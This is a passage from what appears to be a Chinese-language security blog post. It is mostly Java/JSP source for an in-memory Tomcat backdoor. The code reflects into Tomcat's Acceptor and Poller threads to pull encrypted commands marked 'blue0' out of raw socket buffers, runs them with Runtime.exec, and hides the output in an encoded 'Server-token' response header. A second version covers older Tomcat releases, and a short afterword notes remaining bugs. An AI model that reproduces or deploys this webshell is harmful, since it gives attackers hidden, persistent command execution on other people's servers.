                    }
                    if (jioEndPoint == null) {
                        try {
                            jioEndPoint = getField(target, "endpoint");
                        } catch (Exception e) {
                            new Object();
                        }
                    } else {
                        return jioEndPoint;
                    }
                }
            }
            return new Object();
        }
        public class threadexcutor extends ThreadPoolExecutor {
            public threadexcutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler) {
                super(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory, handler);
            }
            public String getRequest() {
                try {
                    Thread[] threads = (Thread[]) ((Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads"));
                    for (Thread thread : threads) {
                        if (thread != null) {
                            String threadName = thread.getName();
                            if (!threadName.contains("exec") && threadName.contains("Acceptor")) {
                                Object target = getField(thread, "target");
                                if (target instanceof Runnable) {
                                    try {
                                        Object[] objects = (Object[]) getField(getField(getField(target, "this$0"), "nioChannels"), "stack");
                                        ByteBuffer heapByteBuffer = (ByteBuffer) getField(getField(objects[0], "appReadBufHandler"), "byteBuffer");
                                        String a = new String(heapByteBuffer.array(), "UTF-8");
                                        if (a.indexOf("blue0") > -1) {
                                            System.out.println(a.indexOf("blue0"));
                                            System.out.println(a.indexOf("\r", a.indexOf("blue0")) - 1);
                                            String b = a.substring(a.indexOf("blue0") + "blue0".length() + 1, a.indexOf("\r", a.indexOf("blue0")) - 1);
                                            b = decode(DEFAULT_SECRET_KEY, b);
                                            return b;
                                        }
                                    } catch (Exception var11) {
                                        System.out.println(var11);
                                        continue;
                                    }
                                }
                            }
                        }
                    }
                } catch (Exception ignored) {
                }
                return new String();
            }
            public String getRequest2(){
                Thread[] threads = (Thread[]) ((Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads"));
                for (Thread thread : threads) {
                    if (thread != null) {
                        String threadName = thread.getName();
                        if (threadName.contains("Poller")) {
                            Object target = getField(thread, "target");
                            if (target instanceof Runnable) {
                                try {
                                    byte[] bytes = new byte[8192];
                                    ByteBuffer buf = ByteBuffer.wrap(bytes);
                                    try {
                                        LinkedList linkedList = (LinkedList) getField(getField(getField(target, "selector"), "kqueueWrapper"), "updateList");
                                        for (Object obj : linkedList) {
                                            try {
                                                SelectionKey[] selectionKeys = (SelectionKey[]) getField(getField(obj, "channel"), "keys");
                                                for (Object tmp : selectionKeys) {
                                                    try {
                                                        NioEndpoint.NioSocketWrapper nioSocketWrapper = (NioEndpoint.NioSocketWrapper) getField(tmp, "attachment");
                                                        try {
                                                            nioSocketWrapper.read(false, buf);
                                                            String a = new String(buf.array(), "UTF-8");
                                                            if (a.indexOf("blue0") > -1) {
                                                                System.out.println(a.indexOf("blue0"));
                                                                System.out.println(a.indexOf("\r", a.indexOf("blue0")));
                                                                String b = a.substring(a.indexOf("blue0") + "blue0".length() + 2, a.indexOf("\r", a.indexOf("blue0")));
                                                                b = decode(DEFAULT_SECRET_KEY, b);
                                                                buf.position(0);
                                                                nioSocketWrapper.unRead(buf);
                                                                System.out.println(b);
                                                                System.out.println(new String(buf.array(), "UTF-8"));
                                                                return b;
                                                            }
                                                            else{
                                                                buf.position(0);
                                                                nioSocketWrapper.unRead(buf);
                                                                continue;
                                                            }
                                                        } catch (Exception e) {
                                                            nioSocketWrapper.unRead(buf);
                                                        }
                                                    } catch (Exception e) {
                                                        continue;
                                                    }
                                                }
                                            } catch (Exception e) {
                                                continue;
                                            }
                                        }
                                    } catch (Exception var11) {
                                        System.out.println(var11);
                                        continue;
                                    }
                                } catch (Exception ignored) {
                                }
                            }
                        }
                        if (threadName.contains("exec")) {
                            return new String();
                        } else {
                            continue;
                        }
                    }
                }
                return new String();
            }
            public void getResponse(byte[] res) {
                try {
                    Thread[] threads = (Thread[]) ((Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads"));
                    for (Thread thread : threads) {
                        if (thread != null) {
                            String threadName = thread.getName();
                            if (!threadName.contains("exec") && threadName.contains("Acceptor")) {
                                Object target = getField(thread, "target");
                                if (target instanceof Runnable) {
                                    try {
                                        ArrayList objects = (ArrayList) getField(getField(getField(getField(target, "this$0"), "handler"), "global"), "processors");
                                        for (Object tmp_object : objects) {
                                            RequestInfo request = (RequestInfo) tmp_object;
                                            Response response = (Response) getField(getField(request, "req"), "response");
                                            response.addHeader("Server-token", encode(DEFAULT_SECRET_KEY,new String(res, "UTF-8")));
                                        }
                                    } catch (Exception var11) {
                                        continue;
                                    }
                                }
                            }
                        }
                    }
                } catch (Exception ignored) {
                }
            }
            @Override
            public void execute(Runnable command) {
    //            System.out.println("123");
                String cmd = getRequest2();
                if (cmd.length() > 1) {
                    try {
                        Runtime rt = Runtime.getRuntime();
                        Process process = rt.exec(cmd);
                        java.io.InputStream in = process.getInputStream();
                        java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);
                        java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
                        String s = "";
                        String tmp = "";
                        while ((tmp = stdInput.readLine()) != null) {
                            s += tmp;
                        }
                        if (s != "") {
                            byte[] res = s.getBytes(StandardCharsets.UTF_8);
                            getResponse(res);
                        }
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
                this.execute(command, 0L, TimeUnit.MILLISECONDS);
            }
        }
    %>
    public String getRequest2(){
        Thread[] threads = (Thread[]) ((Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads"));
        for (Thread thread : threads) {
            if (thread != null) {
                String threadName = thread.getName();
                if (threadName.contains("Poller")) {
                    Object target = getField(thread, "target");
                    if (target instanceof Runnable) {
                        try {
                            byte[] bytes = new byte[8192];
                            ByteBuffer buf = ByteBuffer.wrap(bytes);
                            try {
                                LinkedList linkedList = (LinkedList) getField(getField(getField(target, "selector"), "kqueueWrapper"), "updateList");
                                for (Object obj : linkedList) {
                                    try {
                                        SelectionKey[] selectionKeys = (SelectionKey[]) getField(getField(obj, "channel"), "keys");
                                        for (Object tmp : selectionKeys) {
                                            try {
                                                NioEndpoint.NioSocketWrapper nioSocketWrapper = (NioEndpoint.NioSocketWrapper) getField(tmp, "attachment");
                                                try {
                                                    nioSocketWrapper.read(false, buf);
                                                    String a = new String(buf.array(), "UTF-8");
                                                    if (a.indexOf("blue0") > -1) {
                                                        System.out.println(a.indexOf("blue0"));
                                                        System.out.println(a.indexOf("\r", a.indexOf("blue0")));
                                                        String b = a.substring(a.indexOf("blue0") + "blue0".length() + 2, a.indexOf("\r", a.indexOf("blue0")));
                                                        b = decode(DEFAULT_SECRET_KEY, b);
                                                        buf.position(0);
                                                        nioSocketWrapper.unRead(buf);
                                                        System.out.println(b);
                                                        System.out.println(new String(buf.array(), "UTF-8"));
                                                        return b;
                                                    }
                                                    else{
                                                        buf.position(0);
                                                        nioSocketWrapper.unRead(buf);
                                                        continue;
                                                    }
                                                } catch (Exception e) {
                                                    buf.position(0);
                                                    nioSocketWrapper.unRead(buf);
                                                }
                                            } catch (NoClassDefFoundError e) {
                                                KeyAttachment keyAttachment = (KeyAttachment) getField(tmp, "attachment");
                                                NioChannel nioChannel = keyAttachment.getSocket();
                                                try {
                                                    nioChannel.read(buf);
                                                    String a = new String(buf.array(), "UTF-8");
                                                    if (a.indexOf("blue0") > -1) {
                                                        System.out.println(a.indexOf("blue0"));
                                                        System.out.println(a.indexOf("\r", a.indexOf("blue0")));
                                                        String b = a.substring(a.indexOf("blue0") + "blue0".length() + 2, a.indexOf("\r", a.indexOf("blue0")));
                                                        b = decode(DEFAULT_SECRET_KEY, b);
                                                        buf.position(0);
                                                        nioChannel.getBufHandler().getReadBuffer().put(buf);
                                                        System.out.println(b);
                                                        System.out.println(new String(buf.array(), "UTF-8"));
                                                        return b;
                                                    }
                                                    else{
                                                        buf.position(0);
                                                        nioChannel.getBufHandler().getReadBuffer().put(buf);
                                                        continue;
                                                    }
                                                } catch (Exception b) {
                                                    buf.position(0);
                                                    nioChannel.getBufHandler().getReadBuffer().put(buf);
                                                }
                                                continue;
                                            }
                                        }
                                    } catch (Exception e) {
                                        continue;
                                    }
                                }
                            } catch (Exception var11) {
                                System.out.println(var11);
                                continue;
                            }
                        } catch (Exception ignored) {
                        }
                    }
                }
                if (threadName.contains("exec")) {
                    return new String();
                } else {
                    continue;
                }
            }
        }
        return new String();
    }
**后记**  
仍请忽略我拙劣的coding能力，代码中仍存在一些问题（比如回显size过大导致的response header溢出错误。）  
ps：更正一个错误，Tomcat8.0以前版本在处理io时直接使用NioChannel.read(buf)作为获取数据流的方法，而不同于8.5版本使用封装类SocketWrapperBase，故其中的处理逻辑不支持read()后将buf再重新放回原有的socket（这个说法其实并不准确，其实是tomcat在SocketWrapperBase中手动实现了一个transform方法将已读出的read数据放入后续需要进行处理的read
buffer中），所以对于8.0以前的版本文中所提到的截获socket的方法可能并不适用，还是得使用缓存实现。